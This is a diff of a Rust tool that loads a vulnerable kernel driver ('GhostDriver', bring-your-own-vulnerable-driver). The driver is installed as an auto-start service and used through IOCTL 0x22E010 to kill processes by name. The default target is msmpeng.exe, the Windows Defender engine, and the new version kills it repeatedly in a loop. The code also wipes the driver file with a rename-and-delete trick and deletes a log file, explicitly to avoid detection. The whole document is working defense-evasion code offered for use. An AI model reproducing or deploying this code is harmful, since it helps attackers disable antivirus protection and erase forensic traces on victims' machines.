@@ -1,27 +1,35 @@
 #![allow(non_snake_case,non_camel_case_types, dead_code)]
+
 extern crate winapi;
+use clap::{App, Arg};
+use ctrlc;
+
 use std::ffi::{CString, OsStr, CStr};
+use std::marker::PhantomData;
 use std::mem;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr::{null, null_mut};
-use winapi::ctypes::{c_void, wchar_t};
-use winapi::shared::basetsd::SIZE_T;
-use winapi::shared::minwindef::{DWORD, UINT};
-use winapi::shared::winerror::NO_ERROR;
-use winapi::um::fileapi::{CreateFileA, CreateFileW, DeleteFileA, OPEN_EXISTING, WriteFile, CREATE_ALWAYS};
-use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
-use winapi::um::ioapiset::DeviceIoControl;
-use winapi::um::processenv::GetCurrentDirectoryW;
-use winapi::um::winbase::FILE_FLAG_OVERLAPPED;
-use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER, SERVICE_WIN32_OWN_PROCESS};
-use winapi::um::winsvc::{CloseServiceHandle, ControlService, SERVICE_STOPPED, CreateServiceW, DeleteService, OpenSCManagerA, OpenSCManagerW, OpenServiceA, OpenServiceW, SC_HANDLE, SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_STATUS, StartServiceA};
-use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
-use winapi::um::fileapi::*;
-use winapi::um::winnt::*;
-use std::io::Result;
-use winapi::um::minwinbase::FileRenameInfo;
-use winapi::um::minwinbase::FileDispositionInfo;
+use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
+use std::thread::sleep;
 use std::time::Duration;
+use winapi::ctypes::{c_void, wchar_t};
+use winapi::shared::{
+    minwindef::{DWORD, LPVOID, UINT},
+    ntdef::NULL,
+    winerror::NO_ERROR,
+    basetsd::SIZE_T,
+};
+use winapi::um::{
+    fileapi::{CreateFileW, CreateFileA, DeleteFileA, SetFileInformationByHandle, WriteFile, OPEN_EXISTING, CREATE_ALWAYS, FILE_DISPOSITION_INFO, FILE_RENAME_INFO},
+    handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
+    ioapiset::DeviceIoControl,
+    processenv::GetCurrentDirectoryW,
+    tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS},
+    winnt::{SERVICE_AUTO_START, HANDLE, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER, SERVICE_WIN32_OWN_PROCESS, DELETE, FILE_ATTRIBUTE_NORMAL, GENERIC_WRITE},
+    winsvc::{CloseServiceHandle, ControlService, SERVICE_STOPPED, CreateServiceW, DeleteService, OpenSCManagerA, OpenSCManagerW, OpenServiceA, OpenServiceW, 
+            SC_HANDLE, SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_STATUS, StartServiceA},
+    minwinbase::{FileDispositionInfo, FileRenameInfo},
+};
 
 
 static RENT_DRIVER_64: [u8; DRIVER_SIZE_64] = [
@@ -2723,71 +2731,135 @@ static RENT_DRIVER_64: [u8; DRIVER_SIZE_64] = [
 ];
 
 
-const DRIVER_NAME: &str = "GhostDriver";
-const DRIVER_PATH: &str = "\\ghostdriver.sys";
 const MAX_PATH: usize = 260;
 const DRIVER_SIZE_64: usize = 32328;
+struct GHOST_DRIVER_BYOVD;
+
+
+// Define the trait for driver interaction
+trait Driver {
+    type IoctlStruct;
+
+    fn driver_name() -> &'static str;
+    fn driver_path() -> &'static str;
+    fn device_name() -> &'static str;
+    fn ioctl_code() -> DWORD;
+    fn create_ioctl_struct(pid: DWORD) -> Self::IoctlStruct;
+}
 
 
 #[repr(C, packed)]
-struct RentDrivStruct {
+struct GHOST_DRIVER_BYOVDIoctlStruct {
     level: UINT,
     pid: SIZE_T,
     path: [wchar_t; 1024],
 }
 
-struct RentDrv {
-    h_sc: SC_HANDLE,
-    h_service: SC_HANDLE,
+
+impl GHOST_DRIVER_BYOVDIoctlStruct {
+    fn new(pid: SIZE_T) -> Self {
+        Self {
+            level: 1,
+            pid,
+            path: [0; 1024],
+        }
+    }
 }
 
-impl RentDrv {
+
+impl Driver for GHOST_DRIVER_BYOVD {
+    type IoctlStruct = GHOST_DRIVER_BYOVDIoctlStruct;
+
+    fn driver_name() -> &'static str {
+        "GhostDriver"
+    }
+
+    fn driver_path() -> &'static str {
+        "\\GhostDriver.sys"
+    }
+
+    fn device_name() -> &'static str {
+        "\\\\.\\rentdrv2"  
+    }
+
+    fn ioctl_code() -> DWORD {
+        0x22E010  
+    }
+
+    fn create_ioctl_struct(pid: DWORD) -> Self::IoctlStruct {
+        GHOST_DRIVER_BYOVDIoctlStruct::new(pid as usize)
+    }
+}
+
+
+// GHOST_DRIVER struct and methods
+struct GHOST_DRIVER<D: Driver> {
+    h_sc: SC_HANDLE,
+    h_service: SC_HANDLE,
+    _marker: PhantomData<D>,
+}
+
+impl<D: Driver> GHOST_DRIVER<D> {
     fn new() -> Option<Self> {
-        let h_sc = unsafe { OpenSCManagerW(null(), null(), SC_MANAGER_CREATE_SERVICE) };
+        let h_sc = unsafe { OpenSCManagerW(std::ptr::null(), std::ptr::null(), SC_MANAGER_CREATE_SERVICE) };
         if h_sc.is_null() {
             return None;
         }
-
-        let current_dir = get_current_dir();
-        let file_path = format!("{}{}", current_dir, DRIVER_PATH);
-        let wide_file_path: Vec<u16> = file_path.encode_utf16().collect();
-        let wide_file_path_ptr = wide_file_path.as_ptr();
-
+        
         let h_service = unsafe {
-            CreateServiceW(
+            OpenServiceW(
                 h_sc,
-                to_wstring(DRIVER_NAME).as_ptr(),
-                to_wstring(DRIVER_NAME).as_ptr(),
+                to_wstring(D::driver_name()).as_ptr(),
                 SERVICE_ALL_ACCESS,
-                SERVICE_KERNEL_DRIVER,
-                SERVICE_AUTO_START, 
-                SERVICE_ERROR_NORMAL,
-                wide_file_path_ptr,
-                null(),
-                null_mut(),
-                null(),
-                null(),
-                null(),
             )
         };
 
         if h_service.is_null() {
+            let current_dir = get_current_dir();
+            let file_path = format!("{}{}", current_dir, D::driver_path());
+            let wide_file_path = to_wstring(&file_path);
+            let wide_file_path_ptr = wide_file_path.as_ptr();
+
             let h_service = unsafe {
-                OpenServiceW(
+                CreateServiceW(
                     h_sc,
-                    to_wstring(DRIVER_NAME).as_ptr(),
+                    to_wstring(D::driver_name()).as_ptr(),
+                    to_wstring(D::driver_name()).as_ptr(),
                     SERVICE_ALL_ACCESS,
+                    SERVICE_KERNEL_DRIVER,
+                    SERVICE_AUTO_START, 
+                    SERVICE_ERROR_NORMAL,
+                    wide_file_path_ptr,
+                    std::ptr::null(),
+                    std::ptr::null_mut(),
+                    std::ptr::null(),
+                    std::ptr::null(),
+                    std::ptr::null(),
                 )
             };
 
             if h_service.is_null() {
+                println!("[!] Failed to create service.");
                 unsafe { CloseServiceHandle(h_sc); }
                 return None;
             }
+        } else {
+            println!("[!] Service already exists.");
+            unsafe { CloseServiceHandle(h_sc); }
+            return Some(Self {
+                h_sc,
+                h_service,
+                _marker: PhantomData,
+            });
         }
 
-        Some(Self { h_sc, h_service })
+        Some(Self {
+            h_sc,
+            h_service,
+            _marker: PhantomData,
+        })
     }
+
 
     fn start_driver(&mut self) -> bool {
         let h_sc = unsafe {
@@ -2805,7 +2877,7 @@ impl RentDrv {
         let h_service = unsafe {
             OpenServiceA(
                 h_sc,
-                to_string(DRIVER_NAME).as_ptr(),
+                to_string(D::driver_name()).as_ptr(),
                 SERVICE_ALL_ACCESS,
             )
         };
@@ -2848,11 +2920,12 @@ impl RentDrv {
         true
     }
 
+
     fn stop_driver(&mut self) -> bool {
         let h_sc = unsafe {
             OpenSCManagerA(
-                null(),
-                null(),
+                std::ptr::null(),
+                std::ptr::null(),
                 SC_MANAGER_CREATE_SERVICE,
             )
         };
@@ -2864,7 +2937,7 @@ impl RentDrv {
         let h_service = unsafe {
             OpenServiceA(
                 h_sc,
-                to_string(DRIVER_NAME).as_ptr(),
+                to_string(D::driver_name()).as_ptr(),
                 SERVICE_ALL_ACCESS,
             )
         };
@@ -2872,9 +2945,6 @@ impl RentDrv {
         if h_service.is_null() {
             unsafe {
                 CloseServiceHandle(h_sc);
-            }
-            unsafe {
-                CloseServiceHandle(self.h_service);
             }
             return false;
         }
@@ -2897,33 +2967,80 @@ impl RentDrv {
             )
         };
 
+        if control_result == 0 {
+            println!("[X] Failed to immediately stop the service.");
+        }
+
+        // Attempt to delete the service
         let delete_result = unsafe {
             DeleteService(h_service)
         };
 
-        if control_result == 0 || delete_result == 0 {
-            unsafe {
-                CloseServiceHandle(h_sc);
-            }
-            unsafe {
-                CloseServiceHandle(h_service);
-            }
-            return false;
+        if delete_result == 0 {
+            println!("[X] Failed to delete the service.");
+        } else {
+            println!("[!] Service marked for deletion.");
         }
 
-        unsafe {
-            CloseServiceHandle(h_sc);
-        }
+        // Close handles regardless of the outcomes
         unsafe {
             CloseServiceHandle(h_service);
+            CloseServiceHandle(h_sc);
         }
 
         true
     }
 
+
+    fn kill_process_by_pid(&self, dw_pid: DWORD) {
+        let mut driver_ioctl = D::create_ioctl_struct(dw_pid);
+
+        let h_driver: HANDLE = unsafe {
+            CreateFileW(
+                to_wstring(D::device_name()).as_ptr(),
+                SERVICE_ALL_ACCESS,
+                0,
+                NULL as *mut _,
+                OPEN_EXISTING,
+                0,
+                NULL as *mut _,
+            )
+        };
+
+        if h_driver == INVALID_HANDLE_VALUE {
+            println!("Failed to open driver file.");
+            return;
+        }
+
+        let mut output_buffer: DWORD = 0; // Output buffer to receive data from the driver
+        let mut bytes_returned: DWORD = 0; // Bytes returned
+
+        let ioctl_result = unsafe {
+            DeviceIoControl(
+                h_driver as HANDLE, // Handle to the device
+                D::ioctl_code(), // IOCTL code
+                &mut driver_ioctl as *mut _ as LPVOID, // Pointer to input buffer
+                mem::size_of::<D::IoctlStruct>() as DWORD, // Size of input buffer
+                &mut output_buffer as *mut _ as LPVOID, // Pointer to output buffer
+                mem::size_of::<DWORD>() as DWORD, // Size of output buffer
+                &mut bytes_returned, // Pointer to variable that receives the byte count
+                std::ptr::null_mut(), // Overlapped (not used here)
+            )
+        };
+
+        if ioctl_result == 0 {
+            println!("Failed to send IOCTL.");
+        }
+
+        unsafe {
+            CloseHandle(h_driver);
+        }
+    }
+
+
     fn drop_driver_on_disk(&self) -> bool {
         let current_dir = get_current_dir();
-        let file_path = CString::new(format!("{}{}", current_dir, DRIVER_PATH)).expect("CString::new failed");
+        let file_path = CString::new(format!("{}{}", current_dir, D::driver_path())).expect("CString::new failed");
 
         let h_file = unsafe {
             CreateFileA(
@@ -2974,85 +3091,129 @@ impl RentDrv {
     }
 
 
-
-    fn delete_driver_from_disk(&self) -> bool {
+    fn delete_ioc(&self) -> bool {
         unsafe {
-            
-            let current_dir = get_current_dir();
-            let driver_file_path_str = format!("{}{}", current_dir, DRIVER_PATH);
-
-            
-            let c_driver_file_path = CString::new(driver_file_path_str).expect("CString::new failed");
-
-            
-            let delete_driver_result = DeleteFileA(c_driver_file_path.as_ptr()) != 0;
-
-            
             let log_file_path_str = "C:\\rentdrv.log";
-
-            
             let c_log_file_path = CString::new(log_file_path_str).expect("CString::new failed");
-
-            
             let delete_log_result = DeleteFileA(c_log_file_path.as_ptr()) != 0;
-
-            
-            delete_driver_result && delete_log_result
+            delete_log_result
         }
     }
 
 
-    fn kill_process_by_pid(&self, dw_pid: DWORD) {
-        let mut driver_ioctl = RentDrivStruct {
-            level: 1,
-            pid: dw_pid as SIZE_T,
-            path: [0; 1024],
-        };
+    fn  open_handle(path: &str) -> Result<HANDLE, std::io::Error> {
+        let path_wide: Vec<u16> = OsStr::new(path)
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
 
-        println!("[!] Kill process started !");
-
-        let h_driver = unsafe {
+        let handle = unsafe {
             CreateFileW(
-                to_wstring("\\\\.\\rentdrv2").as_ptr(),
-                GENERIC_READ | GENERIC_WRITE,
-                FILE_SHARE_READ | FILE_SHARE_WRITE,
+                path_wide.as_ptr(),
+                DELETE,
+                0,
                 null_mut(),
                 OPEN_EXISTING,
-                FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
+                FILE_ATTRIBUTE_NORMAL,
                 null_mut(),
             )
         };
 
-        if h_driver == INVALID_HANDLE_VALUE {
-            println!("Failed to open driver file.");
-            return;
+        if handle == INVALID_HANDLE_VALUE {
+            Err(std::io::Error::last_os_error())
+        } else {
+            Ok(handle)
         }
+    }
 
-        let mut bytes_returned: DWORD = 0;
-        let ioctl_result = unsafe {
-            DeviceIoControl(
-                h_driver,
-                0x22E010,
-                &mut driver_ioctl as *mut _ as *mut winapi::ctypes::c_void,
-                mem::size_of::<RentDrivStruct>() as DWORD,
-                null_mut(),
-                0,
-                &mut bytes_returned,
-                null_mut(),
-            )
+
+    fn rename_handle(handle: HANDLE) -> Result<(), std::io::Error> {
+        let new_name = ":GhostDriver";
+        let new_name_wide: Vec<u16> = OsStr::new(new_name)
+            .encode_wide()
+            .collect(); 
+
+        let file_name_length = (new_name_wide.len() * std::mem::size_of::<u16>()) as DWORD;
+
+        
+        let mut buffer = vec![0u8; std::mem::size_of::<FILE_RENAME_INFO>() + new_name_wide.len() * std::mem::size_of::<u16>()];
+        let info = unsafe {
+            &mut *(buffer.as_mut_ptr() as *mut FILE_RENAME_INFO)
         };
 
-        if ioctl_result == 0 {
-            println!("Failed to send IOCTL.");
+        info.ReplaceIfExists = 0;
+        info.RootDirectory = null_mut();
+        info.FileNameLength = file_name_length as DWORD;
+
+        
+        unsafe {
+            std::ptr::copy_nonoverlapping(
+                new_name_wide.as_ptr(),
+                info.FileName.as_mut_ptr(),
+                new_name_wide.len(),
+            );
+
+            if SetFileInformationByHandle(
+                handle,
+                FileRenameInfo,
+                buffer.as_ptr() as *mut _,
+                buffer.len() as DWORD,
+            ) == 0
+            {
+                return Err(std::io::Error::last_os_error());
+            }
         }
+
+        Ok(())
+    }
+
+
+    fn deposite_handle(handle: HANDLE) -> Result<(), std::io::Error> {
+        let mut info = FILE_DISPOSITION_INFO { DeleteFile: 1 };
 
         unsafe {
-            CloseHandle(h_driver);
+            if SetFileInformationByHandle(
+                handle,
+                FileDispositionInfo,
+                &mut info as *mut _ as *mut _,
+                std::mem::size_of::<FILE_DISPOSITION_INFO>() as DWORD,
+            ) == 0
+            {
+                return Err(std::io::Error::last_os_error());
+            }
         }
 
-        println!("[!] Kill process ended !");
+        Ok(())
     }
+
+
+    fn erase_driver_file(driver_path_str: &str) -> Result<(), std::io::Error> {
+        let handle = Self::open_handle(driver_path_str).expect("Failed to open file handle");
+        println!("[*] Open file handler");
+        println!("[*] Handle: {:?}", handle);
+
+        Self::rename_handle(handle).expect("Failed to rename file handle");
+        println!("[*] Rename file");
+
+        unsafe { CloseHandle(handle); }
+        println!("[*] Close file handler");
+        std::thread::sleep(Duration::from_millis(500));
+
+        let handle = Self::open_handle(driver_path_str).expect("Failed to open file handle again");
+        println!("[*] Open file handler");
+        println!("[*] Handle: {:?}", handle);
+
+        Self::deposite_handle(handle).expect("Failed to mark file for deletion");
+        println!("[*] Mark file for deletion");
+
+        unsafe { CloseHandle(handle); }
+        println!("[*] Close file handler");
+
+        Ok(())
+    }
+
 }
+
 
 fn to_wstring(s: &str) -> Vec<u16> {
     OsStr::new(s)
@@ -3061,9 +3222,11 @@ fn to_wstring(s: &str) -> Vec<u16> {
         .collect()
 }
 
+
 fn to_string(s: &str) -> CString {
     CString::new(s).unwrap()
 }
+
 
 fn get_current_dir() -> String {
     let mut buf: Vec<u16> = vec![0; MAX_PATH];
@@ -3077,11 +3240,12 @@ fn get_current_dir() -> String {
 }
 
 
-fn get_pids_by_names(process_names: Vec<&str>) -> Vec<DWORD> {
+fn get_pids_by_names(process_names: &[&str]) -> Vec<DWORD> {
     let mut pids = Vec::new();
     let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
 
     if snapshot == INVALID_HANDLE_VALUE {
+        eprintln!("Failed to create process snapshot.");
         return pids;
     }
 
@@ -3093,7 +3257,6 @@ fn get_pids_by_names(process_names: Vec<&str>) -> Vec<DWORD> {
             let process_name = unsafe { CStr::from_ptr(process_entry.szExeFile.as_ptr()) }
                 .to_string_lossy()
                 .to_lowercase();
-
             if process_names.contains(&process_name.as_str()) {
                 pids.push(process_entry.th32ProcessID);
             }
@@ -3102,6 +3265,8 @@ fn get_pids_by_names(process_names: Vec<&str>) -> Vec<DWORD> {
                 break;
             }
         }
+    } else {
+        eprintln!("Failed to get first process entry.");
     }
 
     unsafe { CloseHandle(snapshot) };
@@ -3109,126 +3274,49 @@ fn get_pids_by_names(process_names: Vec<&str>) -> Vec<DWORD> {
 }
 
 
-fn open_handle(path: &str) -> Result<HANDLE> {
-    let path_wide: Vec<u16> = OsStr::new(path)
-        .encode_wide()
-        .chain(std::iter::once(0))
-        .collect();
-
-    let handle = unsafe {
-        CreateFileW(
-            path_wide.as_ptr(),
-            DELETE,
-            0,
-            null_mut(),
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            null_mut(),
-        )
-    };
-
-    if handle == INVALID_HANDLE_VALUE {
-        Err(std::io::Error::last_os_error())
+fn parse_comma_separated_values(input: &str) -> Vec<&str> {
+    if input.is_empty() {
+        Vec::new()
     } else {
-        Ok(handle)
+        input.split(',').map(str::trim).collect()
     }
 }
-
-fn rename_handle(handle: HANDLE) -> Result<()> {
-    let new_name = ":GhostDriver";
-    let new_name_wide: Vec<u16> = OsStr::new(new_name)
-        .encode_wide()
-        .collect(); 
-
-    let file_name_length = (new_name_wide.len() * std::mem::size_of::<u16>()) as DWORD;
-
-    
-    let mut buffer = vec![0u8; std::mem::size_of::<FILE_RENAME_INFO>() + new_name_wide.len() * std::mem::size_of::<u16>()];
-    let info = unsafe {
-        &mut *(buffer.as_mut_ptr() as *mut FILE_RENAME_INFO)
-    };
-
-    info.ReplaceIfExists = 0;
-    info.RootDirectory = null_mut();
-    info.FileNameLength = file_name_length as DWORD;
-
-    
-    unsafe {
-        std::ptr::copy_nonoverlapping(
-            new_name_wide.as_ptr(),
-            info.FileName.as_mut_ptr(),
-            new_name_wide.len(),
-        );
-
-        if SetFileInformationByHandle(
-            handle,
-            FileRenameInfo,
-            buffer.as_ptr() as *mut _,
-            buffer.len() as DWORD,
-        ) == 0
-        {
-            return Err(std::io::Error::last_os_error());
-        }
-    }
-
-    Ok(())
-}
-
-
-fn deposite_handle(handle: HANDLE) -> Result<()> {
-    let mut info = FILE_DISPOSITION_INFO { DeleteFile: 1 };
-
-    unsafe {
-        if SetFileInformationByHandle(
-            handle,
-            FileDispositionInfo,
-            &mut info as *mut _ as *mut _,
-            std::mem::size_of::<FILE_DISPOSITION_INFO>() as DWORD,
-        ) == 0
-        {
-            return Err(std::io::Error::last_os_error());
-        }
-    }
-
-    Ok(())
-}
-
-fn erase_driver_file(driver_path_str: &str) -> Result<()> {
-    let handle = open_handle(driver_path_str).expect("Failed to open file handle");
-    println!("[*] Open file handler");
-    println!("[*] Handle: {:?}", handle);
-
-    rename_handle(handle).expect("Failed to rename file handle");
-    println!("[*] Rename file");
-
-    unsafe { CloseHandle(handle); }
-    println!("[*] Close file handler");
-    std::thread::sleep(Duration::from_millis(500));
-
-    let handle = open_handle(driver_path_str).expect("Failed to open file handle again");
-    println!("[*] Open file handler");
-    println!("[*] Handle: {:?}", handle);
-
-    deposite_handle(handle).expect("Failed to mark file for deletion");
-    println!("[*] Mark file for deletion");
-
-    unsafe { CloseHandle(handle); }
-    println!("[*] Close file handler");
-
-    Ok(())
-}
-
 
 
 fn main() {
-    
-    let process_names = vec!["msmpeng.exe", "cmd.exe"];
+    let matches = App::new("GHOST_DRIVER Process Killer")
+        .version("2.0")
+        .author("BlackSnufkin")
+        .about("Kills processes by name using a Ghost Driver")
+        .arg(Arg::new("process_names")
+             .short("n")
+             .long("name")
+             .takes_value(true)
+             .multiple(false) 
+             .required(false)
+             .help("\n\nUSAGE:\n\
+                         \t.\\GhostDriver.exe -n msmpeng.exe,svchost.exe\n\
+                         \t.\\GhostDriver.exe --name msmpeng.exe\n\
+                         \t.\\GhostDriver.exe (uses default processes)\n"))
+        .get_matches();
 
-    
-    let rent_drv = RentDrv::new();
-    if let Some(mut drv) = rent_drv {
+    let process_names_arg = matches.value_of("process_names").unwrap_or("");
+    let mut process_names = parse_comma_separated_values(process_names_arg);
+
+    // Define default process names
+    let default_process_names = vec!["msmpeng.exe"];
+
+    // Use default process names if no arguments are provided
+    if process_names.is_empty() {
+        println!("[!] No process names provided. Using default process names.");
+        process_names = default_process_names.clone();
+    }
+
+
+    let GHOST_DRIVER_drv = GHOST_DRIVER::<GHOST_DRIVER_BYOVD>::new();
+    if let Some(mut drv) = GHOST_DRIVER_drv {
         println!("[!] Driver is initialized !");
-
+        
         if drv.drop_driver_on_disk() {
             println!("[!] Driver dropped on disk !");
         }
@@ -3237,32 +3325,56 @@ fn main() {
             println!("[!] Driver started !");
         }
 
-        
+        sleep(Duration::from_millis(700));
         let driver_file_name = "ghostdriver.sys"; 
         let current_dir = std::env::current_dir().expect("Failed to get current directory");
         let driver_path = current_dir.join(driver_file_name);
         let driver_path_str = driver_path.to_str().expect("Path to string conversion failed");
 
-        if let Err(e) = erase_driver_file(driver_path_str) {
+        if let Err(e) = GHOST_DRIVER::<GHOST_DRIVER_BYOVD>::erase_driver_file(driver_path_str) {
             eprintln!("[X] Failed to erase driver file: {}", e);
         }
 
+
+        let continue_loop = Arc::new(AtomicBool::new(true));
+        let continue_loop_clone = continue_loop.clone();
+
+        ctrlc::set_handler(move || {
+            continue_loop_clone.store(false, Ordering::SeqCst);
+        }).expect("Error setting Ctrl+C handler");
+    
         
-        let pids = get_pids_by_names(process_names);
+        let pids = get_pids_by_names(&process_names);
         for pid in pids {
+            println!("[!] Killing process with PID: {}", pid);
             drv.kill_process_by_pid(pid);
+        }  
+
+        println!("[!] Press Ctrl+C to stop the program.");
+
+        loop {
+            // Sleep for a duration before the next iteration
+
+            sleep(Duration::from_millis(700));
+            if !continue_loop.load(Ordering::SeqCst) {
+                break;
+            }
+
+
+            let pids = get_pids_by_names(&process_names);
+            for pid in pids {
+                println!("[!] Killing process with PID: {}", pid);
+                drv.kill_process_by_pid(pid);
+            }  
+
         }
-
-        println!("[!] cleaning up all IOCs files to avoid detection!");
-        let mut input = String::new();
-        std::io::stdin().read_line(&mut input).unwrap();
-
+        
         if drv.stop_driver() {
             println!("[!] Driver stopped !");
         }
 
-        if drv.delete_driver_from_disk() {
-            println!("[!] Driver deleted from disk !");
+        if drv.delete_ioc() {
+            println!("[!] IOC deleted from disk !");
         }
     } else {
         println!("[X] Failed to initialize the driver.");
